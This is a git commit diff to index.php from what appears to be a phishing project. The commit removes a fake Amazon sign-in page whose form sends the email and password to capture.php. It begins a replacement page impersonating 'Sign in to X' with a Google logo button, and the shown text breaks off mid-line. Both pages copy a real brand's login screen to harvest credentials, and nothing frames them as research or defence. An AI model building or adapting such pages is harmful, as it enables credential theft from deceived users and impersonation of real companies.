e02c573ce7b47e6338aa1437fc60225590a55ef6
harish2975 <harishraghav2975@gmail.com>
2025-01-01 23:09:38 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,28 +1,15 @@
-<!-- File: index.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Amazon Sign In</title>
-    <link rel="stylesheet" href="./style.css">
+    <title>Sign in to X</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <div class="signin-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" class="logo">
-        <h1>Sign in</h1>
-
-        <form action="./capture.php" method="POST">
-            <label for="email">Email or mobile phone number</label>
-            <input type="text" id="email" name="email" required>
-            <input type="password" id="password" name="password" required>
-            <button type="submit">Continue</button>
-        </form>
-
-        <p class="small-text">By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
-        <a href="#" class="help-link">Need help?</a>
-        <p class="new-account">New to Amazon?</p>
-        <a href="#" class="create-account">Create your Amazon account</a>
-    </div>
-</body>
-</html>
+    <div class="login-container">
+        <h1>Sign in to X</h1>
+        <form>
+            <button type="button">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/512px-Google_%22G%22_Logo.svg.png" alt="Goo
+vji-qfoo-pxu
